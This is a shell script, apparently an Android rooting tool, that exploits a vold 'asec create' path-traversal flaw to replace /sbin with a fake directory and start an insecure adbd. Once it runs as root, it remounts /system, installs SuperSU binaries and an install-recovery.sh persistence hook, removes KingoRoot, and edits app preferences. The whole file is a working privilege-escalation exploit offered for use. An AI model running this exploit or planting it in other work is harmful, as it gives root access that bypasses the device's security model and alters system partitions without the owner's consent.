#!/bin/sh

TMPD=${0%doroot.sh}
TMPD=${TMPD%/}

# test -z "${TMPD}" && TMPD=.
test -z "${TMPD}" && exit

alias bb="${TMPD}/busybox"

# vold exploit from http://retme.net/index.php/2014/10/08/vold-asec.html
if [ "x$1" = "xadbhack" ]; then
    chmod 755 ${TMPD}/*
    ln -s /sbin ${TMPD}/fake
    vdc asec create ../..${TMPD}/fake 4 ext4 none 2000 false
    ln -s ${TMPD}/adbd /sbin/adbd
    bb killall adbd
    exit
fi

if [ -z "$XBINF" ]; then
    echo Empty XBINF
    exit 1
fi

if [ `bb id -u` -ne 0 ]; then
    echo Failed to run insecure adbd
    exit 1
fi

# revert /sbin to original, umount twice to force unmount
umount /sbin 2>/dev/null
umount /sbin 2>/dev/null

# 'Enable su during boot' option is must!
# it takes ages to receive BOOT_COMPLETED broadcast
if [ -f /data/data/eu.chainfire.supersu/shared_prefs/eu.chainfire.supersu_preferences.xml ]; then
    grep 'duringboot" value="false"' /data/data/eu.chainfire.supersu/shared_prefs/eu.chainfire.supersu_preferences.xml >/dev/null
    if [ $? -eq 0 ]; then
        bb sed 's/duringboot" value="false/duringboot" value="true/' /data/data/eu.chainfire.supersu/shared_prefs/eu.chainfire.supersu_preferences.xml > ${TMPD}/tmppref
        am force-stop eu.chainfire.supersu
        cp ${TMPD}/tmppref /data/data/eu.chainfire.supersu/shared_prefs/eu.chainfire.supersu_preferences.xml
        bb chown -R `bb stat -c%u:%g /data/data/eu.chainfire.supersu` /data/data/eu.chainfire.supersu/shared_prefs
    fi
else
    mkdir /data/data/eu.chainfire.supersu/shared_prefs
    cp ${TMPD}/eu.chainfire.supersu_preferences.xml /data/data/eu.chainfire.supersu/shared_prefs/
    bb chown -R `bb stat -c%u:%g /data/data/eu.chainfire.supersu` /data/data/eu.chainfire.supersu/shared_prefs
fi

mount -o rw,remount /system
cd /system/xbin
# killing daemonsu & removing old su is not required, but just in case..
bb killall daemonsu 2>/dev/null
bb chattr -ia /system/bin/su /system/sbin/su /system/bin/.ext/.su su daemonsu sugote supolicy /system/lib/libsupol.so 2>/dev/null
rm -f /system/bin/su /system/sbin/su /system/bin/.ext/.su su daemonsu sugote sugote-mksh supolicy /system/lib/libsupol.so
if [ -e /system/app/KingoUser.apk ]; then
    pm uninstall com.kingoroot.com >/dev/null
    am force-stop com.kingouser.com
    rm -f /system/app/KingoUser.apk /data/dalvik-cache/system@app@KingoUser.apk@classes.dex
fi
for i in ${XBINF};do cp ${TMPD}/$i .;chmod 755 $i;done
ln su daemonsu
ln su sugote
mkdir -p /system/bin/.ext
cp su /system/bin/.ext/.su
cp /system/bin/mksh sugote-mksh
cp ${TMPD}/libsupol.so /system/lib/
chmod 644 /system/lib/libsupol.so
cp ${TMPD}/install-recovery.sh /system/etc/
rm -rf ${TMPD}

echo > /sys/kernel/uevent_helper
/system/xbin/daemonsu --daemon
sleep 1
am start -a android.intent.action.MAIN -n eu.chainfire.supersu/.MainActivity >/dev/null
busybox killall adbd

